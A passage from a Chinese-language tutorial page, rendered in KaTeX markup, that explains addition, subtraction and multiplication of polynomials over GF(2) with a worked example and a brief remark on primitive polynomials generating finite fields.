class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span></span></span></span></span></p>
<ol>
<li>多项式的系数只能是 0 或 1（即【0，p-1】）。若 p=3，那么系数是可以取 0，1，2 的；</li>
<li>合并同类项加法即⊕，对系数进行异或操作</li>
<li>减法就等于加法（即无所谓的减法），或者负系数</li>
</ol>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>设</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mtext>，</mtext><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">设f(x)=x^6+x^4+x^2+x+1，g(x)=x^7+x+1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">设</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi>x</mi><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mn>1</mn><mo>=</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">f(x)+g(x)=x^7+x^6+x^4+x^2+(1+1)x+(1+1)1=x^7+x^6+x^4+x^2
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mtext>–</mtext><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)–g(x)=f(x)+g(x)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">–</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>13</mn></msup><mo>+</mo><msup><mi>x</mi><mn>11</mn></msup><mo>+</mo><msup><mi>x</mi><mn>9</mn></msup><mo>+</mo><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>7</mn></msup><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>13</mn></msup><mo>+</mo><msup><mi>x</mi><mn>11</mn></msup><mo>+</mo><msup><mi>x</mi><mn>9</mn></msup><mo>+</mo><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">f(x)*g(x)=(x^{13}+x^{11}+x^9+x^8+x^7)+(x^7+x^5+x^3+x^2+x)+(x^6+x^4+x^2+x+1)=x^{13}+x^{11}+x^9+x^8+x^6+x^5+x^4+x^3+1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<p>有限域的元素可以通过该域上的本原多项式生成。通过本原多项式得到的域，其加法单位元都是 0，乘法单位元是 1。本原多项式是一个素多项式（素多项式不能表示为其他两个多项式相乘的乘积，类似于素数）。</p>
